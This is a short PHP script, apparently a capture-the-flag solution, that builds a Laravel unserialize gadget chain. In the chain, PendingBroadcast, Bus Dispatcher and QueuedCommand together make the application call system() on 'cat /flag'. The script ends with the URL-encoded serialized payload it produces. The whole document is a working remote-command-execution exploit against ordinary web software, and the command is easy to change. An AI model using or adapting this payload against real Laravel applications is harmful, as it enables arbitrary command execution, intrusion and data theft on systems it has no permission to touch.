<?php
namespace Illuminate\Broadcasting{

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct(){
            $this->events=new Dispatcher();
            $this->event=new QueuedCommand();
        }
    }
}
namespace Illuminate\Foundation\Console{
    class QueuedCommand
    {
        public $connection="cat /flag";
    }
}
namespace Illuminate\Bus{
    class Dispatcher
    {
        protected $queueResolver="system";

    }
}
namespace{

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
}

#O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D

